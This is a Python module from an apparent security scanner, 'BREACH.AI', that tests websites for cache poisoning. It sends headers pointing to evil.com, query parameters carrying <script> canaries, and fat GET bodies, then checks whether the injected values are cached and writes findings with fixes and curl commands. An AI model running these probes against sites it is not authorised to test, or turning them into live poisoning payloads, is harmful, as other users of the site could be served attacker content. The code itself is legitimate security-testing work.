"""
BREACH.AI - Web Cache Poisoning Exploiter
==========================================
Detects web cache poisoning vulnerabilities.
"""

import asyncio
import random
import string
from typing import List, Optional
from .base import BaseAttack, Finding, Severity


class CachePoisoner(BaseAttack):
    """
    Web Cache Poisoning Exploiter

    Tests for:
    - Unkeyed header injection
    - Unkeyed query parameters
    - Cache key normalization issues
    - Fat GET requests
    - Parameter cloaking
    """

    name = "Cache Poisoner"

    UNKEYED_HEADERS = [
        "X-Forwarded-Host",
        "X-Forwarded-Scheme",
        "X-Forwarded-Proto",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Host",
        "X-Forwarded-Server",
        "X-HTTP-Method-Override",
        "X-Original-Host",
        "Forwarded",
        "X-Forwarded-For",
        "X-Real-IP",
        "CF-Connecting-IP",
        "True-Client-IP",
        "X-Client-IP",
        "X-Cluster-Client-IP",
    ]

    async def run(self) -> List[Finding]:
        findings = []

        # Test if caching is present
        cache_detected = await self._detect_cache()
        if not cache_detected:
            return findings

        # Test unkeyed headers
        header_findings = await self._test_unkeyed_headers()
        findings.extend(header_findings)

        # Test unkeyed query parameters
        param_findings = await self._test_unkeyed_params()
        findings.extend(param_findings)

        # Test fat GET
        fat_get_finding = await self._test_fat_get()
        if fat_get_finding:
            findings.append(fat_get_finding)

        return findings

    async def _detect_cache(self) -> bool:
        """Detect if caching is present."""
        cache_headers = [
            "X-Cache",
            "X-Cache-Hit",
            "CF-Cache-Status",
            "X-Varnish",
            "Age",
            "X-Drupal-Cache",
            "X-Proxy-Cache",
            "Surrogate-Control",
        ]

        try:
            response = await self.client.get(self.target)
            headers_lower = {k.lower(): v for k, v in response.headers.items()}

            for header in cache_headers:
                if header.lower() in headers_lower:
                    return True

            # Check for cache-control indicators
            cc = headers_lower.get("cache-control", "")
            if "max-age" in cc or "s-maxage" in cc:
                return True

        except Exception:
            pass

        return False

    async def _test_unkeyed_headers(self) -> List[Finding]:
        """Test for unkeyed header injection."""
        findings = []
        canary = self._generate_canary()

        for header in self.UNKEYED_HEADERS:
            try:
                # Send request with poisoned header
                poison_url = f"{self.target}?cb={canary}"
                response = await self.client.get(
                    poison_url,
                    headers={header: f"evil.com/{canary}"}
                )

                # Check if header value is reflected
                if canary in response.text or "evil.com" in response.text:
                    # Verify it's cached
                    await asyncio.sleep(0.5)
                    verify_response = await self.client.get(poison_url)

                    if canary in verify_response.text or "evil.com" in verify_response.text:
                        findings.append(Finding(
                            title=f"Web Cache Poisoning via {header}",
                            severity=Severity.HIGH,
                            category="Cache Poisoning",
                            endpoint=self.target,
                            method="GET",
                            description=f"The {header} header is reflected in the response but not included "
                                       f"in the cache key, allowing cache poisoning attacks.",
                            evidence=f"Header: {header}: evil.com/{canary}\nReflected and cached",
                            business_impact=100000,
                            impact_explanation="Cache poisoning can be used to serve malicious content "
                                             "to all users, enabling XSS, phishing, or defacement.",
                            fix_suggestion=f"Include the {header} header in the cache key or "
                                         f"disable reflection of this header in responses.",
                            curl_command=f"curl -H '{header}: evil.com' '{self.target}'"
                        ))
                        break  # Found one, enough

            except Exception:
                continue

        return findings

    async def _test_unkeyed_params(self) -> List[Finding]:
        """Test for unkeyed query parameters."""
        findings = []
        canary = self._generate_canary()

        # Common unkeyed parameters
        unkeyed_params = [
            "utm_source", "utm_medium", "utm_campaign",
            "fbclid", "gclid", "ref", "source",
            "callback", "jsonp", "debug", "_"
        ]

        for param in unkeyed_params:
            try:
                cache_buster = self._generate_canary()
                poison_url = f"{self.target}?cb={cache_buster}&{param}=<script>{canary}</script>"

                response = await self.client.get(poison_url)

                if canary in response.text:
                    # Verify caching without the unkeyed param
                    clean_url = f"{self.target}?cb={cache_buster}"
                    await asyncio.sleep(0.5)
                    verify_response = await self.client.get(clean_url)

                    if canary in verify_response.text:
                        findings.append(Finding(
                            title=f"Cache Poisoning via Unkeyed Parameter: {param}",
                            severity=Severity.HIGH,
                            category="Cache Poisoning",
                            endpoint=self.target,
                            method="GET",
                            description=f"The {param} parameter is reflected but not part of cache key.",
                            evidence=f"Parameter {param} with XSS payload was cached",
                            business_impact=100000,
                            impact_explanation="Can inject XSS into cached responses.",
                            fix_suggestion=f"Either include {param} in cache key or stop reflecting it.",
                            curl_command=f"curl '{poison_url}'"
                        ))
                        break

            except Exception:
                continue

        return findings

    async def _test_fat_get(self) -> Optional[Finding]:
        """Test for fat GET request cache poisoning."""
        canary = self._generate_canary()

        try:
            # Send GET with body
            response = await self.client.request(
                "GET",
                f"{self.target}?cb={canary}",
                content=f"search={canary}xss",
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )

            if f"{canary}xss" in response.text:
                # Verify it's cached
                await asyncio.sleep(0.5)
                verify = await self.client.get(f"{self.target}?cb={canary}")

                if f"{canary}xss" in verify.text:
                    return Finding(
                        title="Cache Poisoning via Fat GET Request",
                        severity=Severity.HIGH,
                        category="Cache Poisoning",
                        endpoint=self.target,
                        method="GET",
                        description="The server processes GET request body and caches the result.",
                        evidence=f"Body content reflected in cached response",
                        business_impact=100000,
                        impact_explanation="Fat GET allows cache poisoning via request body.",
                        fix_suggestion="Ignore request body for GET requests at cache level.",
                        curl_command=f"curl -X GET -d 'search=xss' '{self.target}'"
                    )

        except Exception:
            pass

        return None

    def _generate_canary(self) -> str:
        """Generate random canary value."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
